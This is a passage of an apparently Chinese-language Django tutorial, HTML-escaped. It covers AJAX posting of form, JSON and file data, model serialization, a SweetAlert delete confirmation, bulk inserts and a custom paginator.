  &#x6570;&#x636E;&#x683C;&#x5F0F;:username=jason&amp;age=<span class="hljs-number">20</span>
    django&#x540E;&#x7AEF;&#x9488;&#x5BF9;&#x7B26;&#x5408;urlencoded&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x90FD;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x89E3;&#x6790;&#x5C01;&#x88C5;&#x5230;request.POST&#x4E2D;
      username=jason&amp;age=<span class="hljs-number">20</span>    &gt;&gt;&gt; request.POST
</code></pre>
<h4 id="ajax&#x53D1;&#x9001;json&#x683C;&#x5F0F;&#x6570;&#x636E;">ajax&#x53D1;&#x9001;json&#x683C;&#x5F0F;&#x6570;&#x636E;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x524D;&#x540E;&#x7AEF;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#x4E00;&#x5B9A;&#x8981;&#x786E;&#x4FDD;&#x7F16;&#x7801;&#x683C;&#x5F0F;&#x8DDF;&#x6570;&#x636E;&#x771F;&#x6B63;&#x7684;&#x683C;&#x5F0F;&#x662F;&#x4E00;&#x81F4;&#x7684;
&#x4E0D;&#x8981;&#x9A97;&#x4EBA;&#x5BB6;!!!

{&quot;username&quot;:&quot;jason&quot;,&quot;age&quot;:25}  
    &#x5728;request.POST&#x91CC;&#x9762;&#x80AF;&#x5B9A;&#x627E;&#x4E0D;&#x5230;

    django&#x9488;&#x5BF9;json&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E; &#x4E0D;&#x4F1A;&#x505A;&#x4EFB;&#x4F55;&#x7684;&#x5904;&#x7406; 

request&#x5BF9;&#x8C61;&#x65B9;&#x6CD5;&#x8865;&#x5145;
    request.is_ajax()
        &#x5224;&#x65AD;&#x5F53;&#x524D;&#x8BF7;&#x6C42;&#x662F;&#x5426;&#x662F;ajax&#x8BF7;&#x6C42; &#x8FD4;&#x56DE;&#x5E03;&#x5C14;&#x503C;

&quot;&quot;&quot;

&lt;script&gt;
    $(&apos;#d1&apos;).click(function () {
        $.ajax({
            url:&apos;&apos;,
            type:&apos;post&apos;,
            data:JSON.stringify({&apos;username&apos;:&apos;jason&apos;,&apos;age&apos;:25}),
            contentType:&apos;application/json&apos;,  // &#x6307;&#x5B9A;&#x7F16;&#x7801;&#x683C;&#x5F0F;
            success:function () {

            }
        })
    })
&lt;/script&gt;

        json_bytes = request.body
        json_str = json_bytes.decode(&apos;utf-8&apos;)
        json_dict = json.loads(json_str)

        # json.loads&#x62EC;&#x53F7;&#x5185;&#x5982;&#x679C;&#x4F20;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x90A3;&#x4E48;&#x5185;&#x90E8;&#x81EA;&#x52A8;&#x89E3;&#x7801;&#x518D;&#x53CD;&#x5E8F;&#x5217;&#x5316;
        json_dict = json.loads(json_bytes)

&quot;&quot;&quot;
ajax&#x53D1;&#x9001;json&#x683C;&#x5F0F;&#x6570;&#x636E;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x70B9;
    1.contentType&#x53C2;&#x6570;&#x6307;&#x5B9A;&#x6210;:application/json
    2.&#x6570;&#x636E;&#x662F;&#x771F;&#x6B63;&#x7684;json&#x683C;&#x5F0F;&#x6570;&#x636E;
    3.django&#x540E;&#x7AEF;&#x4E0D;&#x4F1A;&#x5E2E;&#x4F60;&#x5904;&#x7406;json&#x683C;&#x5F0F;&#x6570;&#x636E;&#x9700;&#x8981;&#x4F60;&#x81EA;&#x5DF1;&#x53BB;request.body&#x83B7;&#x53D6;&#x5E76;&#x5904;&#x7406;
&quot;&quot;&quot;
</code></pre>
<h4 id="ajax&#x53D1;&#x9001;&#x6587;&#x4EF6;">ajax&#x53D1;&#x9001;&#x6587;&#x4EF6;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
ajax&#x53D1;&#x9001;&#x6587;&#x4EF6;&#x9700;&#x8981;&#x501F;&#x52A9;&#x4E8E;js&#x5185;&#x7F6E;&#x5BF9;&#x8C61;FormData

&quot;&quot;&quot;
&lt;script&gt;
    // &#x70B9;&#x51FB;&#x6309;&#x94AE;&#x671D;&#x540E;&#x7AEF;&#x53D1;&#x9001;&#x666E;&#x901A;&#x952E;&#x503C;&#x5BF9;&#x548C;&#x6587;&#x4EF6;&#x6570;&#x636E;
    $(&apos;#d4&apos;).on(&apos;click&apos;,function () {
        // 1 &#x9700;&#x8981;&#x5148;&#x5229;&#x7528;FormData&#x5185;&#x7F6E;&#x5BF9;&#x8C61;
        let formDateObj = new FormData();
        // 2 &#x6DFB;&#x52A0;&#x666E;&#x901A;&#x7684;&#x952E;&#x503C;&#x5BF9;
        formDateObj.append(&apos;username&apos;,$(&apos;#d1&apos;).val());
        formDateObj.append(&apos;password&apos;,$(&apos;#d2&apos;).val());
        // 3 &#x6DFB;&#x52A0;&#x6587;&#x4EF6;&#x5BF9;&#x8C61;
        formDateObj.append(&apos;myfile&apos;,$(&apos;#d3&apos;)[0].files[0])
        // 4 &#x5C06;&#x5BF9;&#x8C61;&#x57FA;&#x4E8E;ajax&#x53D1;&#x9001;&#x7ED9;&#x540E;&#x7AEF;
        $.ajax({
            url:&apos;&apos;,
            type:&apos;post&apos;,
            data:formDateObj,  // &#x76F4;&#x63A5;&#x5C06;&#x5BF9;&#x8C61;&#x653E;&#x5728;data&#x540E;&#x9762;&#x5373;&#x53EF;

            // ajax&#x53D1;&#x9001;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x8981;&#x6307;&#x5B9A;&#x7684;&#x4E24;&#x4E2A;&#x53C2;&#x6570;
            contentType:false,  // &#x4E0D;&#x9700;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x7F16;&#x7801; django&#x540E;&#x7AEF;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x8BC6;&#x522B;formdata&#x5BF9;&#x8C61;
            processData:false,  // &#x544A;&#x8BC9;&#x4F60;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x8981;&#x5BF9;&#x4F60;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x5904;&#x7406;

            success:function (args) {
            }
        })


    })
&lt;/script&gt;

def ab_file(request):
    if request.is_ajax():
        if request.method == &apos;POST&apos;:
            print(request.POST)
            print(request.FILES)
    return render(request,&apos;ab_file.html&apos;)

&quot;&quot;&quot;
&#x603B;&#x7ED3;:
    1.&#x9700;&#x8981;&#x5229;&#x7528;&#x5185;&#x7F6E;&#x5BF9;&#x8C61;FormData
                // 2 &#x6DFB;&#x52A0;&#x666E;&#x901A;&#x7684;&#x952E;&#x503C;&#x5BF9;
        formDateObj.append(&apos;username&apos;,$(&apos;#d1&apos;).val());
        formDateObj.append(&apos;password&apos;,$(&apos;#d2&apos;).val());
        // 3 &#x6DFB;&#x52A0;&#x6587;&#x4EF6;&#x5BF9;&#x8C61;
        formDateObj.append(&apos;myfile&apos;,$(&apos;#d3&apos;)[0].files[0])
    2.&#x9700;&#x8981;&#x6307;&#x5B9A;&#x4E24;&#x4E2A;&#x5173;&#x952E;&#x6027;&#x7684;&#x53C2;&#x6570;
                contentType:false,  // &#x4E0D;&#x9700;&#x4F7F;&#x7528;&#x4EFB;&#x4F55;&#x7F16;&#x7801; django&#x540E;&#x7AEF;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x8BC6;&#x522B;formdata&#x5BF9;&#x8C61;
        processData:false,  // &#x544A;&#x8BC9;&#x4F60;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x4E0D;&#x8981;&#x5BF9;&#x4F60;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x5904;&#x7406;
    3.django&#x540E;&#x7AEF;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x8BC6;&#x522B;&#x5230;formdata&#x5BF9;&#x8C61;&#x5E76;&#x4E14;&#x80FD;&#x591F;&#x5C06;&#x5185;&#x90E8;&#x7684;&#x666E;&#x901A;&#x952E;&#x503C;&#x81EA;&#x52A8;&#x89E3;&#x6790;&#x5E76;&#x5C01;&#x88C5;&#x5230;request.POST&#x4E2D; &#x6587;&#x4EF6;&#x6570;&#x636E;&#x81EA;&#x52A8;&#x89E3;&#x6790;&#x5E76;&#x5C01;&#x88C5;&#x5230;request.FILES&#x4E2D;
&quot;&quot;&quot;
</code></pre>
<h4 id="django&#x81EA;&#x5E26;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x7EC4;&#x4EF6;drf&#x505A;&#x94FA;&#x57AB;">django&#x81EA;&#x5E26;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x7EC4;&#x4EF6;(drf&#x505A;&#x94FA;&#x57AB;)</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x5982;&#x679C;&#x53D1;&#x73B0;&#x4F60;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;MySQL&#x4F46;&#x662F;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;sqlite3
&#x4E0D;&#x8981;&#x614C;&#x5F20;&#x4E0D;&#x8981;&#x6050;&#x60E7; &#x4F60;&#x53EA;&#x9700;&#x8981;&#x6309;&#x7167;&#x4E4B;&#x524D;MySQL&#x7684;&#x64CD;&#x4F5C;&#x5C06;sqlite3&#x7684;&#x9A71;&#x52A8;&#x88C5;&#x4E00;&#x4E0B;&#x5373;&#x53EF;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x9700;&#x6C42;:&#x5728;&#x524D;&#x7AEF;&#x7ED9;&#x6211;&#x83B7;&#x53D6;&#x5230;&#x540E;&#x7AEF;&#x7528;&#x6237;&#x8868;&#x91CC;&#x9762;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E; &#x5E76;&#x4E14;&#x8981;&#x662F;&#x5217;&#x8868;&#x5957;&#x5B57;&#x5178;</span>
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">from</span> django.http <span class="hljs-keyword">import</span> JsonResponse
<span class="hljs-keyword">from</span> django.core <span class="hljs-keyword">import</span> serializers
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ab_ser</span><span class="hljs-params">(request)</span>:</span>
    user_queryset = models.User.objects.all()
    <span class="hljs-comment"># [{},{},{},{},{}]</span>
    <span class="hljs-comment"># user_list = []</span>
    <span class="hljs-comment"># for user_obj in user_queryset:</span>
    <span class="hljs-comment">#     tmp = {</span>
    <span class="hljs-comment">#         &apos;pk&apos;:user_obj.pk,</span>
    <span class="hljs-comment">#         &apos;username&apos;:user_obj.username,</span>
    <span class="hljs-comment">#         &apos;age&apos;:user_obj.age,</span>
    <span class="hljs-comment">#         &apos;gender&apos;:user_obj.get_gender_display()</span>
    <span class="hljs-comment">#     }</span>
    <span class="hljs-comment">#     user_list.append(tmp)</span>
    <span class="hljs-comment"># return JsonResponse(user_list,safe=False)</span>
    <span class="hljs-comment"># return render(request,&apos;ab_ser.html&apos;,locals())</span>

    <span class="hljs-comment"># &#x5E8F;&#x5217;&#x5316;</span>
    res = serializers.serialize(<span class="hljs-string">&apos;json&apos;</span>,user_queryset)
    <span class="hljs-string">&quot;&quot;&quot;&#x4F1A;&#x81EA;&#x52A8;&#x5E2E;&#x4F60;&#x5C06;&#x6570;&#x636E;&#x53D8;&#x6210;json&#x683C;&#x5F0F;&#x7684;&#x5B57;&#x7B26;&#x4E32; &#x5E76;&#x4E14;&#x5185;&#x90E8;&#x975E;&#x5E38;&#x7684;&#x5168;&#x9762;&quot;&quot;&quot;</span>
    <span class="hljs-keyword">return</span> HttpResponse(res)
<span class="hljs-string">&quot;&quot;&quot;
[
 {&quot;pk&quot;: 1, &quot;username&quot;: &quot;jason&quot;, &quot;age&quot;: 25, &quot;gender&quot;: &quot;male&quot;}, 
 {&quot;pk&quot;: 2, &quot;username&quot;: &quot;egon&quot;, &quot;age&quot;: 31, &quot;gender&quot;: &quot;female&quot;},
 {&quot;pk&quot;: 3, &quot;username&quot;: &quot;kevin&quot;, &quot;age&quot;: 32, &quot;gender&quot;: &quot;others&quot;}, 
 {&quot;pk&quot;: 4, &quot;username&quot;: &quot;tank&quot;, &quot;age&quot;: 40, &quot;gender&quot;: 4}
 ]
&#x524D;&#x540E;&#x7AEF;&#x5206;&#x79BB;&#x7684;&#x9879;&#x76EE;
    &#x4F5C;&#x4E3A;&#x540E;&#x7AEF;&#x5F00;&#x53D1;&#x7684;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x5199;&#x4EE3;&#x7801;&#x5C06;&#x6570;&#x636E;&#x5904;&#x7406;&#x597D;
    &#x80FD;&#x591F;&#x5E8F;&#x5217;&#x5316;&#x8FD4;&#x56DE;&#x7ED9;&#x524D;&#x7AEF;&#x5373;&#x53EF; 
        &#x518D;&#x5199;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;&#x6587;&#x6863; &#x544A;&#x8BC9;&#x524D;&#x7AEF;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x4EE3;&#x8868;&#x7684;&#x610F;&#x601D;&#x5373;&#x53EF;


[
{   &quot;model&quot;: &quot;app01.user&quot;, 
    &quot;pk&quot;: 1, 
    &quot;fields&quot;: {&quot;username&quot;: &quot;jason&quot;, &quot;age&quot;: 25, &quot;gender&quot;: 1]}, 

{   &quot;model&quot;: &quot;app01.user&quot;, 
    &quot;pk&quot;: 2, 
    &quot;fields&quot;: {&quot;username&quot;: &quot;egon&quot;, &quot;age&quot;: 31, &quot;gender&quot;: 2]}, 

{   &quot;model&quot;: &quot;app01.user&quot;, 
    &quot;pk&quot;: 3, 
    &quot;fields&quot;: {&quot;username&quot;: &quot;kevin&quot;, &quot;age&quot;: 32, &quot;gender&quot;: 3]},

{   &quot;model&quot;: &quot;app01.user&quot;, 
    &quot;pk&quot;: 4, 
    &quot;fields&quot;: {&quot;username&quot;: &quot;tank&quot;, &quot;age&quot;: 40, &quot;gender&quot;: 4]}
]
&#x5199;&#x63A5;&#x53E3;&#x5C31;&#x662F;&#x5229;&#x7528;&#x5E8F;&#x5217;&#x5316;&#x7EC4;&#x4EF6;&#x6E32;&#x67D3;&#x6570;&#x636E;&#x7136;&#x540E;&#x5199;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;&#x6587;&#x6863; &#x8BE5;&#x4EA4;&#x4EE3;&#x4EA4;&#x4EE3;&#x4E00;&#x4E0B;&#x5C31;&#x5B8C;&#x4E8B;
&quot;&quot;&quot;</span>
</code></pre>
<p><a href="https://imgse.com/i/p9GcyKe" target="_blank"><img src="https://s1.ax1x.com/2023/05/02/p9GcyKe.png" alt="p9GcyKe.png"></a></p>
<h4 id="ajax&#x7ED3;&#x5408;sweetalert">ajax&#x7ED3;&#x5408;sweetalert</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x81EA;&#x5DF1;&#x8981;&#x5B66;&#x4F1A;&#x5982;&#x4F55;&#x62F7;&#x8D1D;
&#x5B66;&#x4F1A;&#x57FA;&#x4E8E;&#x522B;&#x4EBA;&#x7684;&#x57FA;&#x7840;&#x4E4B;&#x4E0A;&#x505A;&#x4FEE;&#x6539;
&#x7814;&#x7A76;&#x5404;&#x4E2A;&#x53C2;&#x6570;&#x8868;&#x793A;&#x7684;&#x610F;&#x601D; &#x7136;&#x540E;&#x627E;&#x846B;&#x82A6;&#x753B;&#x74E2;
&quot;&quot;&quot;
&lt;script&gt;
    $(&apos;.del&apos;).on(&apos;click&apos;,function () {
        // &#x5148;&#x5C06;&#x5F53;&#x524D;&#x6807;&#x7B7E;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x8D77;&#x6765;
        let currentBtn = $(this);
        // &#x4E8C;&#x6B21;&#x786E;&#x8BA4;&#x5F39;&#x6846;
        swal({
          title: &quot;&#x4F60;&#x786E;&#x5B9A;&#x8981;&#x5220;&#x5417;?&quot;,
          text: &quot;&#x4F60;&#x53EF;&#x8981;&#x8003;&#x8651;&#x6E05;&#x9664;&#x54E6;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x62CE;&#x5305;&#x8DD1;&#x8DEF;&#x54E6;!&quot;,
          type: &quot;warning&quot;,
          showCancelButton: true,
          confirmButtonClass: &quot;btn-danger&quot;,
          confirmButtonText: &quot;&#x662F;&#x7684;&#xFF0C;&#x8001;&#x5B50;&#x5C31;&#x8981;&#x5220;!&quot;,
          cancelButtonText: &quot;&#x7B97;&#x4E86;,&#x7B97;&#x4E86;!&quot;,
          closeOnConfirm: false,
          closeOnCancel: false,
          showLoaderOnConfirm: true
        },
        function(isConfirm) {
          if (isConfirm) {
                // &#x671D;&#x540E;&#x7AEF;&#x53D1;&#x9001;ajax&#x8BF7;&#x6C42;&#x5220;&#x9664;&#x6570;&#x636E;&#x4E4B;&#x540E; &#x518D;&#x5F39;&#x4E0B;&#x9762;&#x7684;&#x63D0;&#x793A;&#x6846;
                $.ajax({
                    {#url:&apos;/delete/user/&apos; + currentBtn.attr(&apos;delete_id&apos;),  // 1 &#x4F20;&#x9012;&#x4E3B;&#x952E;&#x503C;&#x65B9;&#x5F0F;1#}
                    url:&apos;/delete/user/&apos;,  // 2 &#x653E;&#x5728;&#x8BF7;&#x6C42;&#x4F53;&#x91CC;&#x9762;
                    type:&apos;post&apos;,
                    data:{&apos;delete_id&apos;:currentBtn.attr(&apos;delete_id&apos;)},
                    success:function (args) {  // args = {&apos;code&apos;:&apos;&apos;,&apos;msg&apos;:&apos;&apos;}
                        // &#x5224;&#x65AD;&#x54CD;&#x5E94;&#x72B6;&#x6001;&#x7801; &#x7136;&#x540E;&#x505A;&#x4E0D;&#x540C;&#x7684;&#x5904;&#x7406;
                        if(args.code === 1000){
                            swal(&quot;&#x5220;&#x4E86;!&quot;, args.msg, &quot;success&quot;);
                            // 1.lowb&#x7248;&#x672C; &#x76F4;&#x63A5;&#x5237;&#x65B0;&#x5F53;&#x524D;&#x9875;&#x9762;
                            {#window.location.reload()#}
                            // 2.&#x5229;&#x7528;DOM&#x64CD;&#x4F5C; &#x52A8;&#x6001;&#x5237;&#x65B0;
                            currentBtn.parent().parent().remove()
                        }else{
                            swal(&apos;&#x5B8C;&#x4E86;&apos;,&apos;&#x51FA;&#x73B0;&#x4E86;&#x4F4D;&#x7F6E;&#x7684;&#x9519;&#x8BEF;&apos;,&apos;info&apos;)
                        }
                    }

                })

          } else {
            swal(&quot;&#x6002;&#x903C;&quot;, &quot;&#x4E0D;&#x8981;&#x8BF4;&#x6211;&#x8BA4;&#x8BC6;&#x4F60;&quot;, &quot;error&quot;);
          }
        });
    })

&lt;/script&gt;
</code></pre>
<h4 id="&#x6279;&#x91CF;&#x63D2;&#x5165;">&#x6279;&#x91CF;&#x63D2;&#x5165;</h4>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ab_pl</span><span class="hljs-params">(request)</span>:</span>
    <span class="hljs-comment"># &#x5148;&#x7ED9;Book&#x63D2;&#x5165;&#x4E00;&#x4E07;&#x6761;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># for i in range(10000):</span>
    <span class="hljs-comment">#     models.Book.objects.create(title=&apos;&#x7B2C;%s&#x672C;&#x4E66;&apos;%i)</span>
    <span class="hljs-comment"># # &#x518D;&#x5C06;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x67E5;&#x8BE2;&#x5E76;&#x5C55;&#x793A;&#x5230;&#x524D;&#x7AEF;&#x9875;&#x9762;</span>
    book_queryset = models.Book.objects.all()

    <span class="hljs-comment"># &#x6279;&#x91CF;&#x63D2;&#x5165;</span>
    <span class="hljs-comment"># book_list = []</span>
    <span class="hljs-comment"># for i in range(100000):</span>
    <span class="hljs-comment">#     book_obj = models.Book(title=&apos;&#x7B2C;%s&#x672C;&#x4E66;&apos;%i)</span>
    <span class="hljs-comment">#     book_list.append(book_obj)</span>
    <span class="hljs-comment"># models.Book.objects.bulk_create(book_list)</span>
    <span class="hljs-string">&quot;&quot;&quot;
    &#x5F53;&#x4F60;&#x60F3;&#x8981;&#x6279;&#x91CF;&#x63D2;&#x5165;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019; &#x4F7F;&#x7528;orm&#x7ED9;&#x4F60;&#x63D0;&#x4F9B;&#x7684;bulk_create&#x80FD;&#x591F;&#x5927;&#x5927;&#x7684;&#x51CF;&#x5C11;&#x64CD;&#x4F5C;&#x65F6;&#x95F4;
    :param request: 
    :return: 
    &quot;&quot;&quot;</span>
    <span class="hljs-keyword">return</span> render(request,<span class="hljs-string">&apos;ab_pl.html&apos;</span>,locals())
</code></pre>
<h4 id="&#x5206;&#x9875;&#x5668;">&#x5206;&#x9875;&#x5668;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x603B;&#x6570;&#x636E;100 &#x6BCF;&#x9875;&#x5C55;&#x793A;10 &#x9700;&#x8981;10
&#x603B;&#x6570;&#x636E;101 &#x6BCF;&#x9875;&#x5C55;&#x793A;10 &#x9700;&#x8981;11
&#x603B;&#x6570;&#x636E;99 &#x6BCF;&#x9875;&#x5C55;&#x793A;10  &#x9700;&#x8981;10

&#x5982;&#x4F55;&#x901A;&#x8FC7;&#x4EE3;&#x7801;&#x52A8;&#x6001;&#x7684;&#x8BA1;&#x7B97;&#x51FA;&#x5230;&#x5E95;&#x9700;&#x8981;&#x591A;&#x5C11;&#x9875;&#xFF1F;


&#x5728;&#x5236;&#x4F5C;&#x9875;&#x7801;&#x4E2A;&#x6570;&#x7684;&#x65F6;&#x5019; &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x662F;&#x5947;&#x6570;&#x4E2A;        &#x7B26;&#x5408;&#x4E2D;&#x56FD;&#x4EBA;&#x5BF9;&#x79F0;&#x7F8E;&#x7684;&#x6807;&#x51C6;
&quot;&quot;&quot;</span>
<span class="hljs-comment"># &#x5206;&#x9875;</span>
    book_list = models.Book.objects.all()

    <span class="hljs-comment"># &#x60F3;&#x8BBF;&#x95EE;&#x54EA;&#x4E00;&#x9875;</span>
    current_page = request.GET.get(<span class="hljs-string">&apos;page&apos;</span>,<span class="hljs-number">1</span>)  <span class="hljs-comment"># &#x5982;&#x679C;&#x83B7;&#x53D6;&#x4E0D;&#x5230;&#x5F53;&#x524D;&#x9875;&#x7801; &#x5C31;&#x5C55;&#x793A;&#x7B2C;&#x4E00;&#x9875;</span>
    <span class="hljs-comment"># &#x6570;&#x636E;&#x7C7B;&#x578B;&#x8F6C;&#x6362;</span>
    <span class="hljs-keyword">try</span>:
        current_page = int(current_page)
    <span class="hljs-keyword">except</span> Exception:
        current_page = <span class="hljs-number">1</span>
    <span class="hljs-comment"># &#x6BCF;&#x9875;&#x5C55;&#x793A;&#x591A;&#x5C11;&#x6761;</span>
    per_page_num = <span class="hljs-number">10</span>
    <span class="hljs-comment"># &#x8D77;&#x59CB;&#x4F4D;&#x7F6E;</span>
    start_page = (current_page - <span class="hljs-number">1</span>) * per_page_num
    <span class="hljs-comment"># &#x7EC8;&#x6B62;&#x4F4D;&#x7F6E;</span>
    end_page = current_page * per_page_num

    <span class="hljs-comment"># &#x8BA1;&#x7B97;&#x51FA;&#x5230;&#x5E95;&#x9700;&#x8981;&#x591A;&#x5C11;&#x9875;</span>
    all_count = book_list.count()

    page_count, more = divmod(all_count, per_page_num)
    <span class="hljs-keyword">if</span> more:
        page_count += <span class="hljs-number">1</span>

    page_html = <span class="hljs-string">&apos;&apos;</span>
    xxx = current_page
    <span class="hljs-keyword">if</span> current_page &lt; <span class="hljs-number">6</span>:
        current_page = <span class="hljs-number">6</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(current_page<span class="hljs-number">-5</span>,current_page+<span class="hljs-number">6</span>):
        <span class="hljs-keyword">if</span> xxx == i:
            page_html += <span class="hljs-string">&apos;&lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;?page=%s&quot;&gt;%s&lt;/a&gt;&lt;/li&gt;&apos;</span>%(i,i)
        <span class="hljs-keyword">else</span>:
            page_html += <span class="hljs-string">&apos;&lt;li&gt;&lt;a href=&quot;?page=%s&quot;&gt;%s&lt;/a&gt;&lt;/li&gt;&apos;</span>%(i,i)



    book_queryset =  book_list[start_page:end_page]

<span class="hljs-string">&quot;&quot;&quot;
django&#x4E2D;&#x6709;&#x81EA;&#x5E26;&#x7684;&#x5206;&#x9875;&#x5668;&#x6A21;&#x5757; &#x4F46;&#x662F;&#x4E66;&#x5199;&#x8D77;&#x6765;&#x5F88;&#x9EBB;&#x70E6;&#x5E76;&#x4E14;&#x529F;&#x80FD;&#x592A;&#x7B80;&#x5355;
&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x60F3;&#x6CD5;&#x548C;&#x8BBE;&#x6CD5;&#x7684;&#x5199;&#x81EA;&#x5B9A;&#x4E49;&#x5206;&#x9875;&#x5668;

&#x4E0A;&#x8FF0;&#x63A8;&#x5BFC;&#x4EE3;&#x7801;&#x4F60;&#x65E0;&#x9700;&#x638C;&#x63E1; &#x53EA;&#x9700;&#x8981;&#x77E5;&#x9053;&#x5185;&#x90E8;&#x903B;&#x8F91;&#x5373;&#x53EF;

&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x4E0A;&#x8FF0;&#x7684;&#x601D;&#x8DEF; &#x5DF2;&#x7ECF;&#x5C01;&#x88C5;&#x597D;&#x4E86;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x7684;&#x81EA;&#x5B9A;&#x4E49;&#x5206;&#x9875;&#x5668; 
&#x4E4B;&#x540E;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x76F4;&#x63A5;&#x62F7;&#x8D1D;&#x5373;&#x53EF;
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x81EA;&#x5B9A;&#x4E49;&#x5206;&#x9875;&#x5668;&#x7684;&#x62F7;&#x8D1D;&#x53CA;&#x4F7F;&#x7528;">&#x81EA;&#x5B9A;&#x4E49;&#x5206;&#x9875;&#x5668;&#x7684;&#x62F7;&#x8D1D;&#x53CA;&#x4F7F;&#x7528;</h4>
<pre><code class="lang-python">&quot;&quot;&quot;
&#x5F53;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;&#x975E;django&#x5185;&#x7F6E;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x529F;&#x80FD;&#x6216;&#x8005;&#x7EC4;&#x4EF6;&#x4EE3;&#x7801;&#x7684;&#x65F6;&#x5019;
&#x6211;&#x4EEC;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;utils&#x6587;&#x4EF6;&#x5939; &#x5728;&#x8BE5;&#x6587;&#x4EF6;&#x5939;&#x5185;&#x5BF9;&#x6A21;&#x5757;&#x8FDB;&#x884C;&#x529F;&#x80FD;&#x6027;&#x5212;&#x5206;
    utils&#x53EF;&#x4EE5;&#x5728;&#x6BCF;&#x4E2A;&#x5E94;&#x7528;&#x4E0B;&#x521B;&#x5EFA; &#x5177;&#x4F53;&#x7ED3;&#x5408;&#x5B9E;&#x9645;&#x60C5;&#x51B5;

&#x6211;&#x4EEC;&#x5230;&#x4E86;&#x540E;&#x671F;&#x5C01;&#x88C5;&#x4EE3;&#x7801;&#x7684;&#x65F6;&#x5019; &#x4E0D;&#x518D;&#x5C40;&#x9650;&#x4E8E;&#x51FD;&#x6570;
&#x8FD8;&#x662F;&#x5C3D;&#x91CF;&#x671D;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x53BB;&#x5C01;&#x88C5;

&#x6211;&#x4EEC;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x5206;&#x9875;&#x5668;&#x662F;&#x57FA;&#x4E8E;bootstrap&#x6837;&#x5F0F;&#x6765;&#x7684; &#x6240;&#x4EE5;&#x4F60;&#x9700;&#x8981;&#x63D0;&#x524D;&#x5BFC;&#x5165;bootstrap
    bootstrap &#x7248;&#x672C; v3
    jQuery        &#x7248;&#x672C; v3
&quot;&quot;&quot;
# &#x540E;&#x7AEF;
book_queryset = models.Book.objects.all()
current_page = request.GET.get(&apos;page&apos;,1)
all_count = book_queryset.count()
# 1 &#x4F20;&#x503C;&#x751F;&#x6210;&#x5BF9;&#x8C61;
page_obj = Pagination(current_page=current_page,all_count=all_count)
# 2 &#x76F4;&#x63A5;&#x5BF9;&#x603B;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5207;&#x7247;&#x64CD;&#x4F5C;
page_queryset = book_queryset[page_obj.start:page_obj.end]
# 3 &#x5C06;page_queryset&#x4F20;&#x9012;&#x5230;&#x9875;&#x9762; &#x66FF;&#x6362;&#x4E4B;&#x524D;&#x7684;book_queryset


# &#x524D;&#x7AEF;
{# for book_obj in page_queryset #}
    &lt;p&gt;{[ book_obj.title ]}&lt;/p&gt;
    &lt;nav aria-label=&quot;Page navigation&quot;&gt;
&lt;/nav&gt;
{# endfor #}
{#&#x5229;&#x7528;&#x81EA;&#x5B9A;&#x4E49;&#x5206;&#x9875;&#x5668;&#x76F4;&#x63A5;&#x663E;&#x793A;&#x5206;&#x9875;&#x5668;&#x6837;&#x5F0F;#}
{[ page_obj.page_html|safe ]}

&quot;&quot;&quot;
